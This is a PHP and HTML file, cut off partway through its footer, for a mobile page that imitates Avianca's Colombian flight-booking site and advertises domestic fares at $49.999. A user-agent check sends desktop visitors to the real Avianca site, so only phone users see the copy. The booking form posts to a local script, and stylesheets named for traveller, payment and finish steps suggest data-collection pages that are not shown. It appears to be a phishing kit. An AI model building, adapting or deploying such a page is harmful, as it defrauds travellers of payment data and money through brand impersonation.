<?php

function esDispositivoMovil() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $dispositivosMoviles = array(
        'Android', 'webOS', 'iPhone', 'iPad',
        'iPod', 'BlackBerry', 'Windows Phone'
    );

    foreach ($dispositivosMoviles as $dispositivo) {
        if (stripos($userAgent, $dispositivo) !== false) {
            return true;
        }
    }

    return false;
}

if (esDispositivoMovil()) {

} else {
    header('location:https://www.avianca.com/es/?poscode=CO&gad_source=1&gclid=Cj0KCQiAmNeqBhD4ARIsADsYfTf3M3CnHWAuPB5TJMPNHLxyBwgvsTEQ9E9ZtptQKnou4p8WNm3papAaAka8EALw_wcB');

}

?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="Pragma" content="no-cache">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">

    <title>Avianca | #NACIONALES</title>

    <link rel="shortcut icon" href="assets/icon.ico">
    <script src="https://use.fontawesome.com/b1ad4d7e81.js"></script><style type="text/css" id="operaUserStyle"></style><link href="https://use.fontawesome.com/b1ad4d7e81.css" media="all" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@48,400,0,0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <link rel="stylesheet" href="./css/index.css" type="text/css">
    <link rel="stylesheet" href="./css/review.css" type="text/css">
    <link rel="stylesheet" href="./css/travelers.css" type="text/css">
    <link rel="stylesheet" href="./css/payment.css" type="text/css">
    <link rel="stylesheet" href="./css/finish.css" type="text/css">
    <link rel="stylesheet" href="./css/otro.css" type="text/css">
    
    
    <style>
        #elementoAocultar {
  display: block; /* o cualquier otro valor de display que desees inicialmente */
}

.oculto {
  display: none;
}
    </style>
</head>

<body ng-controller="startController" class="ng-scope">
    <!-- PAGE ORIGEN -->
    <div class="pageFrom">
        <div class="top">
            <label>¿Cúal es tu origen?</label>
            <div class="closeIcon">
                <ion-icon class="x" name="close-outline"></ion-icon>
            </div>
        </div>

        <input type="text" placeholder="Desde">

        <div class="contentFrom">
            <div class="content">
                <span>Arauca (AUC)</span>
                <p>Aeropuerto Santiago Pérez</p>
            </div>
            <div class="content">
                <span>Armenia (AXM)</span>
                <p>Aeropuerto El Edén</p>
            </div>
            <div class="content">
                <span>Barrancabermeja (EJA)</span>
                <p>Aeropuerto Yariguies</p>
            </div>
            <div class="content">
                <span>Barranquilla (BAQ)</span>
                <p>Aeropuerto Ernesto Corissoz</p>
            </div>
            <div class="content">
                <span>Bogotá (BOG)</span>
                <p>Aeropuerto El Dorado</p>
            </div>
            <div class="content">
                <span>Bucaramanga (BGA)</span>
                <p>Ertopuerto Palonegro</p>
            </div>
            <div class="content">
                <span>Cali (CLO)</span>
                <p>Aeropuerto Alfonso Bonilla Aragón</p>
            </div>
            <div class="content">
                <span>Florencia (FLA)</span>
                <p>Aeropuerto Gustavo Artunduaga Paredes</p>
            </div>
            <div class="content">
                <span>Ibagé (IBE)</span>
                <p>Aeropuerto de Perales</p>
            </div>
            <div class="content">
                <span>Ipiales (IPI)</span>
                <p>Aeropuerto San Luís</p>
            </div>
            <div class="content">
                <span>Leticia (LET)</span>
                <p>Aeropuerto Alfredo Vásquez Cobo</p>
            </div>
            <div class="content">
                <span>Manizales (MZL)</span>
                <p>Aeropuerto La Nubia</p>
            </div>
            <div class="content">
                <span>Medellín (MDE)</span>
                <p>Aeropuerto Jose María Cordova</p>
            </div>
            <div class="content">
                <span>Montería (MTR)</span>
                <p>Aeropuerto Los Garzones</p>
            </div>
            <div class="content">
                <span>Neiva (NVA)</span>
                <p>Aeropuerto Benito Salas</p>
            </div>
            <div class="content">
                <span>Pasto (PSO)</span>
                <p>Aeropuerto Antonio Nariño</p>
            </div>
            <div class="content">
                <span>Pereira (PEI)</span>
                <p>Aeropuerto Matecaña</p>
            </div>
            <div class="content">
                <span>Popayán (PPN)</span>
                <p>Aeropuerto Guillermo León Valencia</p>
            </div>
            <div class="content">
                <span>Puerto Asís (PUU)</span>
                <p>Aeropuerto Tres de Mayo</p>
            </div>
            <div class="content">
                <span>Quibdo (UIB)</span>
                <p>Aeropuerto el Caraño</p>
            </div>
            <div class="content">
                <span>Riohacha (RCH)</span>
                <p>Aeropuerto Almirante Padilla</p>
            </div>
            <div class="content">
                <span>San Andrés (ADZ)</span>
                <p>Aeropuerto Gustavo Rojas Pinilla</p>
            </div>
            <div class="content">
                <span>San José del Guaviare (SJE)</span>
                <p>Aeropuerto Jorge Enrique Gonzáles</p>
            </div>
            <div class="content">
                <span>Santa Marta (SMR)</span>
                <p>Aeropuerto Simón Bolívar</p>
            </div>
            <div class="content">
                <span>Tumaco (TCO)</span>
                <p>Aeropuerto La Florida</p>
            </div>
            <div class="content">
                <span>Valledupar (VUP)</span>
                <p>Aeropuerto Alfonso López Pumarejo</p>
            </div>
            <div class="content">
                <span>Villavicencio (VVC)</span>
                <p>Aeropuerto La Vanguardia</p>
            </div>
            <div class="content">
                <span>YOPAL (VUP)</span>
                <p>Aeropuerto El Alcaraván</p>
            </div>
        </div>
    </div>

    <!-- PAGE DESTINO -->
    <div class="pageUntil">
        <div class="top">
            <label>¿Cúal es tu destino?</label>
            <div class="closeIcon">
                <ion-icon class="x" name="close-outline"></ion-icon>
            </div>
        </div>

        <input type="text" placeholder="Hacia">

        <div class="contentUntil">
            <div class="content">
                <span>Arauca (AUC)</span>
                <p>Aeropuerto Santiago Pérez</p>
            </div>
            <div class="content">
                <span>Armenia (AXM)</span>
                <p>Aeropuerto El Edén</p>
            </div>
            <div class="content">
                <span>Barrancabermeja (EJA)</span>
                <p>Aeropuerto Yariguies</p>
            </div>
            <div class="content">
                <span>Barranquilla (BAQ)</span>
                <p>Aeropuerto Ernesto Corissoz</p>
            </div>
            <div class="content">
                <span>Bogotá (BOG)</span>
                <p>Aeropuerto El Dorado</p>
            </div>
            <div class="content">
                <span>Bucaramanga (BGA)</span>
                <p>Ertopuerto Palonegro</p>
            </div>
            <div class="content">
                <span>Cali (CLO)</span>
                <p>Aeropuerto Alfonso Bonilla Aragón</p>
            </div>
            <div class="content">
                <span>Florencia (FLA)</span>
                <p>Aeropuerto Gustavo Artunduaga Paredes</p>
            </div>
            <div class="content">
                <span>Ibagé (IBE)</span>
                <p>Aeropuerto de Perales</p>
            </div>
            <div class="content">
                <span>Ipiales (IPI)</span>
                <p>Aeropuerto San Luís</p>
            </div>
            <div class="content">
                <span>Leticia (LET)</span>
                <p>Aeropuerto Alfredo Vásquez Cobo</p>
            </div>
            <div class="content">
                <span>Manizales (MZL)</span>
                <p>Aeropuerto La Nubia</p>
            </div>
            <div class="content">
                <span>Medellín (MDE)</span>
                <p>Aeropuerto Jose María Cordova</p>
            </div>
            <div class="content">
                <span>Montería (MTR)</span>
                <p>Aeropuerto Los Garzones</p>
            </div>
            <div class="content">
                <span>Neiva (NVA)</span>
                <p>Aeropuerto Benito Salas</p>
            </div>
            <div class="content">
                <span>Pasto (PSO)</span>
                <p>Aeropuerto Antonio Nariño</p>
            </div>
            <div class="content">
                <span>Pereira (PEI)</span>
                <p>Aeropuerto Matecaña</p>
            </div>
            <div class="content">
                <span>Popayán (PPN)</span>
                <p>Aeropuerto Guillermo León Valencia</p>
            </div>
            <div class="content">
                <span>Puerto Asís (PUU)</span>
                <p>Aeropuerto Tres de Mayo</p>
            </div>
            <div class="content">
                <span>Quibdo (UIB)</span>
                <p>Aeropuerto el Caraño</p>
            </div>
            <div class="content">
                <span>Riohacha (RCH)</span>
                <p>Aeropuerto Almirante Padilla</p>
            </div>
            <div class="content">
                <span>San Andrés (ADZ)</span>
                <p>Aeropuerto Gustavo Rojas Pinilla</p>
            </div>
            <div class="content">
                <span>San José del Guaviare (SJE)</span>
                <p>Aeropuerto Jorge Enrique Gonzáles</p>
            </div>
            <div class="content">
                <span>Santa Marta (SMR)</span>
                <p>Aeropuerto Simón Bolívar</p>
            </div>
            <div class="content">
                <span>Tumaco (TCO)</span>
                <p>Aeropuerto La Florida</p>
            </div>
            <div class="content">
                <span>Valledupar (VUP)</span>
                <p>Aeropuerto Alfonso López Pumarejo</p>
            </div>
            <div class="content">
                <span>Villavicencio (VVC)</span>
                <p>Aeropuerto La Vanguardia</p>
            </div>
            <div class="content">
                <span>YOPAL (VUP)</span>
                <p>Aeropuerto El Alcaraván</p>
            </div>
        </div>
    </div>


    <!-- PAGE CALENDARIO -->
    <div class="pageCalendar">
        <div class="msj">
            <label>¿Cuándo vas a volar?</label>
            <div class="closeIcon">
                <ion-icon class="x" name="close-outline"></ion-icon>
            </div>
        </div>

        <div class="contentCalendar">
            <form action="./a/Booking/cargar_vuelos.php" method="POST">
                <div class="contentInput">
                    <div class="dateInput">
                        <span>Ida</span>
                        <input type="date" name="fechaIda" id="fechaIda" required>
                    </div>
                    
                 
                    
                    <div class="dateInput" id="elementoAocultar" style="display:none;">
                        

        
                        
                        <span>Vuelta</span>
                        <input type="date" name="fechaVuelta" id="fechaVuelta">
                    </div>
                </div>

                <input type="text" name="origenDesde" style="display: none;" id="inputOrigenDesde">
                <input type="text" name="origenAeropuerto" style="display: none;" id="inputOrigenAeropuerto">
                <input type="text" name="destinoHacia" style="display: none;" id= "inputDestinoHacia">
                <input type="text" name="destinoAeropuerto" style="display: none;" id="inputDestinoAeropuerto">

                <div class="button">
                    <button class="dateChoose">
                        Escoger fecha
                    </button>
                </div>
            </form>
        </div>

    </div>

                    

    <div class="Wrapper" id="Wrapper">
        <!-- uiView:  -->
        <div ui-view="" style="height:100%;" class="ng-scope">
            <div class="loadingScreen ng-scope ng-hide" ng-show="loading"></div>
            
            <!-- INICIO WRAPPER -->
            <div class="Wrapper ng-scope">

                <div class="header">
                    <div class="logo" ng-click="redir()">
                        <img src="assets/logo-avianca-minimal.svg" alt="" srcset="">
                    </div>

                    <div class="menuTop" ng-click="redir()">
                        <span class="material-symbols-outlined" style="height: 24px; width: 24px;">
                            menu
                        </span>
                    </div>

                    <div class="menuTop" ng-click="redir()">
                        <img class="user-icon" alt="" src="assets/help@2x.png" style="height: 24px; width: 24px;">
                    </div>

                    <div class="menuTop" ng-click="redir()">
                        <span class="material-symbols-outlined" style="height: 22px; height: 22px; font-size: 22px;">
                            notifications
                        </span>
                    </div>

                    <div class="menuTop" ng-click="redir()">
                        <img class="user-icon" alt="" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHZpZXdCb3g9IjAgMCAyMCAyMCI+CiAgICA8ZGVmcz4KICAgICAgICA8cGF0aCBpZD0icHJlZml4X19hIiBkPSJNMTc0IDE0Yy01LjUyIDAtMTAgNC40OC0xMCAxMHM0LjQ4IDEwIDEwIDEwIDEwLTQuNDggMTAtMTAtNC40OC0xMC0xMC0xMHptLTQuOTMgMTYuMjhjLjQzLS45IDMuMDUtMS43OCA0LjkzLTEuNzhzNC41MS44OCA0LjkzIDEuNzhDMTc3LjU3IDMxLjM2IDE3NS44NiAzMiAxNzQgMzJjLTEuODYgMC0zLjU3LS42NC00LjkzLTEuNzJ6bTExLjI5LTEuNDVjLTEuNDMtMS43NC00LjktMi4zMy02LjM2LTIuMzNzLTQuOTMuNTktNi4zNiAyLjMzQzE2Ni42MiAyNy40OSAxNjYgMjUuODIgMTY2IDI0YzAtNC40MSAzLjU5LTggOC04czggMy41OSA4IDhjMCAxLjgyLS42MiAzLjQ5LTEuNjQgNC44M3pNMTc0IDE4Yy0xLjk0IDAtMy41IDEuNTYtMy41IDMuNXMxLjU2IDMuNSAzLjUgMy41IDMuNS0xLjU2IDMuNS0zLjUtMS41Ni0zLjUtMy41LTMuNXptMCA1Yy0uODMgMC0xLjUtLjY3LTEuNS0xLjVzLjY3LTEuNSAxLjUtMS41IDEuNS42NyAxLjUgMS41LS42NyAxLjUtMS41IDEuNXoiLz4KICAgIDwvZGVmcz4KICAgIDxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTE2NCAtMTQpIj4KICAgICAgICA8dXNlIGZpbGw9IiNGRkYiIGZpbGwtcnVsZT0ibm9uemVybyIgeGxpbms6aHJlZj0iI3ByZWZpeF9fYSIvPgogICAgPC9nPgo8L3N2Zz4K">
                    </div>
                </div>

                <div class="slider">
                    <div class="sliderHover">
                        <div class="bigTextSlider">
                            #NACIONALES
                        </div>
                        <div class="midTextSlider">
                            Destinos nacionales a tan solo $49.999, Hasta agotar existencias!
                        </div>
                        <br>
                        <div class="btnSlider" ng-click="scrollToDesde()">
                            Compra ya
                        </div>
                    </div>

                    <img src="assets/slider/DOT.png" alt="" srcset="" class="dots">
                </div>

                <div class="centralContainer">
                    <!-- INICIO CONTAINER F -->
                    <div class="containerFlight" style="margin-top: -50px;">
                        <div class="headerCF">
                            <div class="titleHCF" id="Desde">
                                Reserva tu vuelo
                            </div>

                            <div class="arrowHCF">
                                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij48cGF0aCBkPSJNNy40MSAxNS40MUwxMiAxMC44M2w0LjU5IDQuNThMMTggMTRsLTYtNi02IDZ6IiBmaWxsPSIjOTY5Njk2Ii8+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjwvc3ZnPg=="
                                    alt="" srcset="">
                            </div>
                        </div>

                        <hr class="separator">

                        <div class="innerContainer">
                            <div class="radioContainer" id="Div_radio1" ng-click="changeFR(1)">
                                <div class="txtRadio">
                                    <!--<div style="width: 1000%; height: 3px;"></div>-->
                                    <!--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Solo ida-->
                                </div>

                                <input id="radioIdayVuelta" ng-model="radioIV" type="radio" name="radioTipoVuelo" class="radioR ng-pristine ng-untouched ng-valid ng-not-empty" checked="checked">
                                <!--<span class="marked greenR" id="radio1" ng-class="{greenR: radioIV == 1}"></span>-->
                                <span class="whiteR" ng-show="radioIV"></span>
                            </div>

                            <div class="radioContainer" id="Div_radio0" ng-click="changeFR(0)" id="divClickeable">
                                <div class="txtRadio">
                                    <div style="width: 1000%; height: 3px;"></div>
                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Solo ida
                                </div>

                                <input id="radioIda" type="radio" ng-model="radioI" name="radioTipoVuelo" id="checkbox" class="radioR ng-pristine ng-untouched ng-valid ng-not-empty">
                                <span class="marked " id="radio0" ng-class="{greenR: radioI == 1}"></span>
                                <span class="whiteR" ng-show="radioI"></span>
                            </div>

                            <br>

                            <!-- INICIO CONTENEDOR TR -->
                            <div class="containerTr">
                                <!--  Cuando el selector es vacio o nulo -->
                                <div class="ciudades origen" id="btnOrigen" data-type="" ng-click="stepCH = 1" ng-class="{'redM': errorOA}">
                                    <div class="placeholder-ciudad-titulo" ng-click="showFrom()"
                                        ng-show="originAirname == undefined">
                                        Desde
                                    </div>

                                    <div class="placeholder-ciudad" ng-show="originAirname == undefined">
                                        Origen
                                    </div>

                                    <div ng-show="originAirname != undefined" class="bigAirportName ng-binding ng-hide" style="margin-bottom: 0px;"></div>
                                    <div ng-show="originAircity != undefined" class="miniAirportName ng-binding ng-hide" style="margin-top: 0px;"></div>
                                </div>

                                <div class="indicador ind-owrt">
                                    <i class="flecha material-icons">swap_horiz</i>
                                </div>

                                <div class="ciudades destino" id="btnDestino" data-type="" ng-class="{'redM': errorDA }">
                                    <div class=" placeholder-ciudad-titulo" ng-show="destinyAirname == undefined">
                                        Hacia
                                    </div>
                                    <div class="placeholder-ciudad" ng-show="destinyAirname == undefined">
                                        Destino
                                    </div>
                                    <div ng-show="destinyAirname != undefined" class="bigAirportName ng-binding ng-hide" style="margin-bottom: 0px;"></div>
                                    <div ng-show="destinyAircity != undefined" class="miniAirportName ng-binding ng-hide" style="margin-top: 0px;"></div>
                                </div>

                            </div>
                            <!-- FIN CONTENEDOR TR -->

                            <!-- INICIO CONTENEDOR VARIOS -->
                            <div class="contenedorv">
                                <div class="booking-fechas" data-type="" ng-click="pickDatesModal()" ng-class="{'redM': errorPD || errorPDD}">
                                    <!--  FECHA IDA -->
                                    <div class="fecha-ida hide" data-x-class="{'hide':'trayecto'}">
                                        <div class="placeholder-fechas" data-x-class="{'hide':'!activePlaceholderDates'}">

                                            <span class="visible-xs" ng-show="pickedDate == undefined">Fechas de viaje</span>

                                            <div ng-show="pickedDate != undefined &amp;&amp; radioIV == 1" class="ng-hide">
                                                <div class="bigAirportName ng-binding" style="margin-bottom: 0px; font-size: .75rem; margin-top: 4px;"></div>
                                                <div class="miniAirportName ng-binding" style="margin-top: 0px; font-size: .625rem;"></div>
                                            </div>

                                            <div ng-show="pickedDate != undefined &amp;&amp; radioI == 1" class="ng-hide">
                                                <div class="bigAirportName ng-binding" style="margin-bottom: 0px;  font-size: .75rem; margin-top: 4px;"> </div>
                                                <div class="miniAirportName ng-binding" style="margin-top: 0px; font-size: .625rem;"></div>
                                            </div>

                                        </div>
                                    </div>
                                </div>

                                <div class="pasajero-clase">
                                    <div class="placeholder-pasajero-clase hide ng-binding" ng-click="stepCH = 4">
                                        1 Adulto
                                    </div>
                                </div>
                            </div>
                            <!-- FIN CONTENEDOR VARIOS -->

                            <div class="cod-descuento">
                                <div class="cod-descuento-empty">
                                    <div class="icono-add">
                                        <i class="material-icons" style="font-size: .875rem;">add_circle</i>
                                    </div>

                                    <div class="texto-add">
                                        Añadir código promocional
                                    </div>
                                </div>
                            </div>

                            <br>
                            <button class="btnSlider" style="width: 87%;" ng-click="goVueloPick()" ng-class="{disabledBtn: lockButton}">
                                Buscar vuelos
                            </button>
                        </div>

                        <br>

                        <div class="opcionesUnderV">
                            <div class="aviancaToursMobile" ng-click="redir()">
                                <a href="https://ayuda.avianca.com/hc/es/requests/new?ticket_form_id=12365195126043" target="_blank" role="link">
                                    <span class="link-mob-complemento"></span>&nbsp;

                                    <span class="link-mob">
                                        Reservas de grupos
                                    </span>

                                    <i class="material-icons">launch</i>
                                </a>
                            </div>

                            <div class="touchpoints" ng-click="redir()">
                                <a href="https://sp.booking.com/index.es.html?aid=2101683&amp;label=pagenavtab-link-2101683-click" target="_blank" role="link">
                                    Hoteles
                                    <i class="material-icons ">launch</i>
                                </a>
                            </div>


                            <div class="touchpoints" ng-click="redir()">
                                <a href="https://www.rentalcars.com/?affiliateCode=avianca695&amp;adplat=homepage" target="_blank" role="link">
                                    Alquiler de autos
                                    <i class="material-icons ">launch</i>
                                </a>
                            </div>
                        </div>
                    </div>
                    <!-- FIN CONTAINER F -->

                    <!-- INICIO CONTAINER F -->
                    <div class="containerFlight" style="margin-top: 10px;" ng-click="redir()">
                        <div class="headerCF">
                            <div class="titleHCF" style="color: #323237;">
                                Gestiona tu reserva
                            </div>

                            <div class="arrowHCF">
                                <img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20width%3D%2224%22%20height%3D%2224%22%20viewBox%3D%220%200%2024%2024%22%3E%0A%20%20%20%20%3Cdefs%3E%0A%20%20%20%20%20%20%20%20%3Cpath%20id%3D%22a%22%20d%3D%22M16.59%208.59L12%2013.17%207.41%208.59%206%2010l6%206%206-6z%22%2F%3E%0A%20%20%20%20%3C%2Fdefs%3E%0A%20%20%20%20%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22b%22%20fill%3D%22%23fff%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23a%22%2F%3E%0A%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%3Cuse%20fill%3D%22%23000%22%20fill-opacity%3D%22.7%22%20xlink%3Ahref%3D%22%23a%22%2F%3E%0A%20%20%20%20%20%20%20%20%3Cg%20fill%3D%22%23de0108%22%20mask%3D%22url(%23b)%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cpath%20d%3D%22M0%200h24v24H0z%22%2F%3E%0A%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E%0A" alt="" srcset="">
                            </div>
                        </div>
                    </div>
                    <!-- FIN CONTAINER F -->

                    <!-- INICIO CONTAINER F -->
                    <div class="containerFlight" style="margin-top: 10px;" ng-click="redir()">
                        <div class="headerCF">
                            <div class="titleHCF" style="color: #323237;">
                                Check-in online
                            </div>

                            <div class="arrowHCF">
                                <img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20width%3D%2224%22%20height%3D%2224%22%20viewBox%3D%220%200%2024%2024%22%3E%0A%20%20%20%20%3Cdefs%3E%0A%20%20%20%20%20%20%20%20%3Cpath%20id%3D%22a%22%20d%3D%22M16.59%208.59L12%2013.17%207.41%208.59%206%2010l6%206%206-6z%22%2F%3E%0A%20%20%20%20%3C%2Fdefs%3E%0A%20%20%20%20%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22b%22%20fill%3D%22%23fff%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23a%22%2F%3E%0A%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%3Cuse%20fill%3D%22%23000%22%20fill-opacity%3D%22.7%22%20xlink%3Ahref%3D%22%23a%22%2F%3E%0A%20%20%20%20%20%20%20%20%3Cg%20fill%3D%22%23de0108%22%20mask%3D%22url(%23b)%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cpath%20d%3D%22M0%200h24v24H0z%22%2F%3E%0A%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E%0A" alt="" srcset="">
                            </div>
                        </div>
                    </div>
                    <!-- FIN CONTAINER F -->

                    <!-- INICIO CONTAINER F -->
                    <div class="containerFlight" style="margin-top: 10px;" ng-click="redir()">
                        <div class="headerCF">
                            <div class="titleHCF" style="color: #323237;">
                                Estado de vuelos
                            </div>

                            <div class="arrowHCF">
                                <img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20width%3D%2224%22%20height%3D%2224%22%20viewBox%3D%220%200%2024%2024%22%3E%0A%20%20%20%20%3Cdefs%3E%0A%20%20%20%20%20%20%20%20%3Cpath%20id%3D%22a%22%20d%3D%22M16.59%208.59L12%2013.17%207.41%208.59%206%2010l6%206%206-6z%22%2F%3E%0A%20%20%20%20%3C%2Fdefs%3E%0A%20%20%20%20%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22b%22%20fill%3D%22%23fff%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23a%22%2F%3E%0A%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%3Cuse%20fill%3D%22%23000%22%20fill-opacity%3D%22.7%22%20xlink%3Ahref%3D%22%23a%22%2F%3E%0A%20%20%20%20%20%20%20%20%3Cg%20fill%3D%22%23de0108%22%20mask%3D%22url(%23b)%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cpath%20d%3D%22M0%200h24v24H0z%22%2F%3E%0A%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E%0A" alt="" srcset="">
                            </div>
                        </div>
                    </div>
                    <!-- FIN CONTAINER F -->

                    <!-- INICIO CONTAINER F -->
                    <div class="containerFlight" style="margin-top: 10px;" ng-click="redir()">
                        <div class="headerCF">
                            <div class="titleHCF" style="color: #323237;">
                                Ascenso a Clase Ejecutiva
                            </div>

                            <div class="arrowHCF">
                                <img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20width%3D%2224%22%20height%3D%2224%22%20viewBox%3D%220%200%2024%2024%22%3E%0A%20%20%20%20%3Cdefs%3E%0A%20%20%20%20%20%20%20%20%3Cpath%20id%3D%22a%22%20d%3D%22M16.59%208.59L12%2013.17%207.41%208.59%206%2010l6%206%206-6z%22%2F%3E%0A%20%20%20%20%3C%2Fdefs%3E%0A%20%20%20%20%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22b%22%20fill%3D%22%23fff%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23a%22%2F%3E%0A%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%3Cuse%20fill%3D%22%23000%22%20fill-opacity%3D%22.7%22%20xlink%3Ahref%3D%22%23a%22%2F%3E%0A%20%20%20%20%20%20%20%20%3Cg%20fill%3D%22%23de0108%22%20mask%3D%22url(%23b)%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cpath%20d%3D%22M0%200h24v24H0z%22%2F%3E%0A%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E%0A"
                                    alt="" srcset="">
                            </div>
                        </div>
                    </div>
                    <!-- FIN CONTAINER F -->
                </div>

                <section class="noticiasSection ">
                    <center>
                        <br><br>
                        <div class="containerNews">
                            <h2 class="text-center title">Te contamos lo que pasa en avianca.com</h2>
                            <p class="subtitle text-center">Disfruta nuevos productos y servicios.</p>

                            <div class="row container-cards">
                                <div class="card-general">
                                    <div class="imagen">
                                        <img class="lazy" data-card="active" alt="" src="https://www.avianca.com/content/dam/avianca_new/contenido/banner-secundario-booking-es.png?cards=true&amp;lazy=true" decoding="async">
                                    </div>

                                    <div class="descripcion">
                                        <h3 id="card_manual_0_951449621">¡Aprovecha estos descuentos!</h3>
                                        <p style="height: 91.375px;">Ya compraste tu tiquete ahora reserva tu
                                            alojamiento en Booking.com con hasta 40 % DCTO en hoteles seleccionados y un
                                            cashback de 3 % en tu tarjeta de crédito o débito.</p>

                                        <a href="https://sp.booking.com/index.html?aid=2101683&amp;label=pagehome-ban-2101683-click"
                                            ng-click="redir()" target="_blank" title="ES:Link abre en otra ventana"
                                            aria-label="Reserva ahora" class="line-link-right underline" role="link"
                                            tabindex="0" aria-describedby="card_manual_0_951449621">
                                            Reserva ahora
                                            <i class="material-icons outerLink" aria-hidden="true">launch</i>
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="owl-dots">
                            <div role="button" class="owl-dot active" style="width: 8px;"><span></span></div>
                            <div role="button" class="owl-dot" style="width: 8px;"><span></span></div>
                            <div role="button" class="owl-dot" style="width: 8px;"><span></span></div>
                        </div>
                    </center>

                    <br><br><br>

                    <div class="footerLinks">
                        <div class="tab-acordeon panel" style="margin-left: 24px;" ng-click="redir()">
                            <div id="vuelos-baratos" role="tab" data-toggle="collapse" data-parent="#enlaces-footer" href="#enlaces-vuelos-baratos" class="encabezado-acordeon collapsed" aria-expanded="false" aria-controls="enlaces-vuelos-baratos">
                                <span class="text-ellipsis" style="margin-left: 20px; padding-left: 0px;">Servicios adicionales </span>
                            </div>
                        </div>

                        <div class="tab-acordeon panel" style="margin-left: 24px;" ng-click="redir()">
                            <div id="vuelos-baratos" role="tab" data-toggle="collapse" data-parent="#enlaces-footer" href="#enlaces-vuelos-baratos" class="encabezado-acordeon collapsed" aria-expanded="false" aria-controls="enlaces-vuelos-baratos">
                                <span class="text-ellipsis" style="margin-left: 20px; padding-left: 0px;">Acerca de</span>
                            </div>
                        </div>

                        <div class="tab-acordeon panel" style="margin-left: 24px;" ng-click="redir()">
                            <div id="vuelos-baratos" role="tab" data-toggle="collapse" data-parent="#enlaces-footer" href="#enlaces-vuelos-baratos" class="encabezado-acordeon collapsed" aria-expanded="false" aria-controls="enlaces-vuelos-baratos">
                                <span class="text-ellipsis" style="margin-left: 20px; padding-left: 0px;">Información útil </span>
                            </div>
                        </div>

                        <div class="tab-acordeon panel" style="margin-left: 24px;" ng-click="redir()">
